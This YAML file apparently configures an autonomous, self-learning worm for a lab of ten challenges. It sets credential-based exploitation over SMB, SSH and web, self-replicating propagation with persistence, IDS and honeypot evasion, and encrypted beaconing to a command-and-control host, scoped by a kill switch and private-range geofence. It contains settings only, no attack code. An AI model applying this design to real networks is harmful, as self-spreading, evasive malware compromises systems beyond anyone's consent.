# Multi-Challenge Training Configuration
# For autonomous training with 10 challenges

network:
  target_ranges:
    - "192.168.200.0/24"    # Challenge network
  excluded_ips:
    - "192.168.200.1"       # Gateway
  scan_timeout: 3
  max_threads: 100
  ports_to_scan:
    - 22    # SSH
    - 21    # FTP
    - 80    # HTTP
    - 443   # HTTPS
    - 445   # SMB
    - 3306  # MySQL
    - 5432  # PostgreSQL
    - 6379  # Redis
    - 8080  # HTTP-Alt
    - 8081  # HTTPS-Alt
    - 9200  # Elasticsearch
    - 27017 # MongoDB

exploit:
  max_exploit_attempts: 5
  exploit_timeout: 15
  use_credentials: true
  credential_wordlist: "wordlists/common_creds.txt"
  enable_smb: true
  enable_ssh: true
  enable_web: true

propagation:
  max_infections: 30
  propagation_delay: 0.2
  persistence_enabled: true
  self_replicate: true

evasion:
  stealth_mode: true
  randomize_timing: true
  detect_honeypots: true
  detect_ids: true

c2:
  c2_server: "192.168.200.1"
  c2_port: 8443
  beacon_interval: 30
  use_encryption: true

ml:
  use_pretrained: false
  online_learning: true
  learning_rate: 0.001

safety:
  kill_switch_enabled: true
  kill_switch_code: "AUTO_TRAIN_STOP"
  auto_destruct_time: 5
  geofence_enabled: true
  allowed_networks:
    - "192.168.200.0/24"
    - "192.168.100.0/24"
    - "127.0.0.0/8"
  max_runtime_hours: 10